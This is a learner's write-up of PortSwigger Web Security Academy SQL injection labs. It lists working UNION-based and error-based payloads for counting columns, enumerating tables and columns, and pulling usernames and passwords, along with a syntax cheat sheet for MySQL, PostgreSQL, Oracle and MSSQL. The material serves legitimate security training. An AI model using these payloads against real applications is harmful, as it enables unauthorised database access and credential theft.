# 🔐 SQL Injection — Write-up

> PortSwigger Web Security Academy  
> Topic: SQLi Manual Testing — Error-based & Union-based

---

## 📋 Labs Completed

| # | Lab Name | Type | Status |
|---|---|---|---|
| 1 | SQL injection UNION attack, determining the number of columns | UNION-based | ✅ |
| 2 | SQL injection UNION attack, finding a column containing text | UNION-based | ✅ |
| 3 | SQL injection UNION attack, retrieving data from other tables | UNION-based | ✅ |
| 4 | SQL injection UNION attack, retrieving multiple values in a single column | UNION-based | ✅ |
| 5 | SQL injection attack, querying the database type and version on Oracle | DB Enumeration | ✅ |
| 6 | SQL injection attack, querying the database type and version on MySQL and Microsoft | DB Enumeration | ✅ |
| 7 | SQL injection attack, listing the database contents on non-Oracle databases | DB Enumeration | ✅ |
| 8 | SQL injection attack, listing the database contents on Oracle | DB Enumeration | ✅ |
| 9 | Visible error-based SQL injection | Error-based | ✅ |

---

## 🧠 Core Concepts

### UNION Attack
Allows you to append an extra query to the original one and retrieve data from other tables.

**Requirements:**
- Same number of columns in both queries
- Compatible data types in each column

### Error-based
Forces the database to include retrieved data inside the error message itself, instead of returning it in the page response.

---

## 🚀 Payloads Used

### Determining the number of columns
```sql
' ORDER BY 1 --
' ORDER BY 2 --
-- keep incrementing until an error occurs
```

### Finding columns that accept text
```sql
' UNION SELECT 'test', NULL --
' UNION SELECT NULL, 'test' --
```

### Extracting data — two columns
```sql
-- Oracle / PostgreSQL
' UNION SELECT NULL, username || ':' || password FROM users --

-- MySQL
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --

-- MySQL (without quotes)
' UNION SELECT NULL, CONCAT(username, 0x3a, password) FROM users --
```

### Querying database type and version
```sql
' UNION SELECT NULL, @@version --              (MySQL / MSSQL)
' UNION SELECT NULL, version() --              (PostgreSQL)
' UNION SELECT NULL, banner FROM v$version --  (Oracle)
```

### Extracting tables
```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL, table_name FROM information_schema.tables --

-- Oracle
' UNION SELECT NULL, table_name FROM all_tables --
```

### Extracting columns
```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --

-- Oracle
' UNION SELECT NULL, column_name FROM all_columns WHERE table_name='USERS' --
```

### Error-based on PostgreSQL
```sql
' AND 1=CAST((SELECT version()) AS int) --
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --
```

---

## ❌ Mistakes I Made

### 1 — Using `||` for concatenation on MySQL
```sql
-- ❌ Failed
' UNION SELECT NULL, username || ':' || password FROM users --

-- ✅ Correct for MySQL
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --
```
**Why:** `||` is only supported in Oracle and PostgreSQL. MySQL requires CONCAT().

---

### 2 — Using `#` directly in the URL
```
-- ❌ Never reached the server
/filter?category=Gifts' ORDER BY 1#

-- ✅ Correct
/filter?category=Gifts' ORDER BY 1%23
```
**Why:** The browser treats `#` as a fragment identifier and strips everything after it before sending the request. URL-encode it as `%23` to pass it to the server.

---

### 3 — Using EXTRACTVALUE on PostgreSQL
```sql
-- ❌ Failed
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --

-- ✅ Correct for PostgreSQL
' AND 1=CAST((SELECT version()) AS int) --
```
**Why:** EXTRACTVALUE is a MySQL-only function. PostgreSQL doesn't support it.

---

### 4 — Not realizing the injection point was in the Cookie
The site wasn't responding to any URL-based injection attempts.  
**Why:** The vulnerability was in the `TrackingId` cookie, not the URL. Burp Suite is required to intercept and modify request headers.

---

### 5 — Using AND with an integer instead of a boolean on PostgreSQL
```sql
-- ❌ Error: argument of AND must be type boolean, not type integer
' AND CAST((SELECT version()) AS int) --

-- ✅ Correct
' AND 1=CAST((SELECT version()) AS int) --
```
**Why:** PostgreSQL requires both sides of AND to evaluate to boolean. Wrapping with `1=` turns it into a boolean comparison.

---

## 📌 Key Notes

| Topic | Note |
|---|---|
| `--` in MySQL | Requires a space after it `-- ` or use `#` / `%23` |
| `information_schema` | Available in all databases except Oracle |
| Oracle | Always requires `FROM DUAL` when no table is needed |
| LIMIT | Required with CAST to ensure only one row is returned |
| Burp Suite | Essential for testing Cookies and Headers |

---

## 🗺️ Syntax Comparison Across Databases

| Operation | MySQL | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|---|
| Version | `@@version` | `version()` | `v$version` | `@@version` |
| Concatenation | `CONCAT(a,b)` | `a \|\| b` | `a \|\| b` | `a + b` |
| List tables | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` |
| Comment | `-- ` or `#` | `--` | `--` | `--` |
| Error-based | `EXTRACTVALUE` | `CAST AS int` | `CTXSYS.DRITHSX.SN` | `CONVERT` |
